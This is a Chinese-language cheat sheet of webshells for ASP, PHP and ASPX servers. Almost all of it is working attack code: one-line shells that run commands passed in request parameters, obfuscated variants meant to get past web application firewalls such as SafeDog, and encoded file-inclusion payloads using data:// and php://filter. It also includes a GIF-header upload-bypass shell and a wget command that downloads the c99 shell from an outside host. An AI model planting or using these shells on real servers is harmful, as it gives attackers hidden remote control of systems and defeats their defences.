## webshell

#### 一、asp shell
	1、asp获取时间代码
	<% =date() %>

	2、asp文件包含过安全狗
	<!--#include file="qq.jpg"-->

	3、asp webshell
	<%eval request("pass")%>
	
#### 二、php
	1、php.ini
	short_open_tag on 
	<? eval($_POST)['pass']; ?>
	asp_tag on 
	
	<% eval($_POST['pass']); %>
	
	
	2、php webshell
	
	cmd 执行命令
	<pre><?$cx1=$_GET['cx'];echo `$cx1`;?><pre>
	
	?cx=whoami
	
	执行函数
	<?php
	/** post： p=phpinfo() **/
	$xh = "assert hello";
	$xh1 = rtrim($xh," hello");
	@$xh1($_POST[p]);
	?>
	
	<?php
	/**
	* Noticed: (PHP 5 >= 5.4.0, PHP 7)
	* Cknife
	*/
	$password = "LandGrey";
	array_udiff_assoc(array($_REQUEST[$password]), array(1), 	"assert");
	?>
	
	<?php @eval($_POST['pass']);?>
	
	<script language="php">eval($_POST[‘cmd’])</script>
	
	<?php function login(){ $jum = $_POST[j]; return $Jum; } eval(	login()); ?>
	
	<?php $a=range(1,200);$b=chr($a[96]).chr($a[114]).chr($a[114]).c	hr($a[100]).chr($a[113]).chr($a[115]); $b(${chr($a[94]).chr($a[7	9]).chr($a[78]).chr($a[82]).chr($a[83])}[chr($a[51])]); ?> 	密码： 4 
	
	<?php system('id');?>
	<?system('id');?>
	<?system('uname -a');?>
	<?system('wget http://www.sh3ll.org/c99.txt -O shell.php');?>
	
	<? system($_GET['c']); ?>
	0x3c3f2073797374656d28245f4745545b2763275d293b203f3e
	
	PD8gc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
	%3C%3F%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E
	char(60,63,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99	,39,93,41,59,32,63,62)
	data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami
	data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=wget 	http://www.sh3ll.org/c99.txt -O shell.php
	php://filter/resource=http://www.sh3ll.org/c99.txt?
	php://filter/convert.base64-encode/resource=index
	php://filter/convert.base64-encode/resource=index.php
	data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami
	data:;base64,<? exec($_GET[cmd]); ?>&cmd=whoami
	data:;base64,PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkk	nXT8+IiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB	2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT8+Ij48aW5wdXQgdHl	wZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0+PHByZT48PyAKZWNobyBgey	RfUE9TVFsneCddfWA7ID8+PC9wcmU+PD8gZGllKCk7ID8+Cgo=
	data:;base64,PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkk	nXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4I	iB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT8%2BIj48aW5wdXQ	gdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNo	byBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
	
#### 三、aspx
	<%@ Page Language="Jscript"%><%eval(	Request.Item["pass"],"unsafe");%>
	
	<%@ Page Language="Jscript" validateRequest="false" 	%><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
	
	<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(	Server.MapPath(Request("f")) ) %>
	
	<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"	+"v"+/*-/*-*/"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"	+"t"+"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+"	,"+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval (/*-/*-*/P	/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%> 	密码-7
	
	GIF89a888<%Cun=REquEst("CUN"):EvaL(Cun)%> <%Y=request("cun")%> 	<%execute(Y)%> <%eval request("cun")%> <%execute 	request("cun")%> <%execute(request("cun"))%> %><%Eval(Request(	chr(35)))%><% <%eval request(chr(35))%> <%eval request("cun")%> 	<%ExecuteGlobal request("cun")%> if Request("cun")<>"" then 	ExecuteGlobal request("cun") end if //容错代码
	
	<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(11	5)+chr(116))("sz"))%> 	